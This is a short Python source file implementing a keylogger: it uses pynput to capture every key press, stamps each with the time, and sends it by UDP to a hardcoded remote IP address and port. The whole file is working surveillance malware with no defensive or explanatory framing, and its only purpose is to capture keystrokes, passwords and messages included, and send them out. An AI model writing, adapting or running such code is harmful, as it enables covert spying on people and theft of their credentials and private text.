from pynput import keyboard
from pynput import mouse
import time
from socket import *
import sys


keyThreshold = 1 #modify threshold to not constantly send out
keyCount = 0
keys = []

#command line input variables
hostName = "35.202.167.184" # sys.argv[1]
serverPort = 1024 # int(sys.argv[2])

#setup socket
udpSocket = socket(AF_INET, SOCK_DGRAM)

#press handler
def on_key_press(key):
    global keys, keyCount
    keys.append(key)
    keyCount += 1

    if keyCount >= keyThreshold:
        keyCount = 0
        submit_keys(keys)
        keys = []

#release handler
def on_key_release(key):
    pass


#submit handler
def submit_keys(keys):
    for key in keys:
        message = time.asctime(time.gmtime(time.time())) + ": " +str(key) + '\n'
        udpSocket.sendto(message.encode(),(hostName, serverPort))


#listener
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()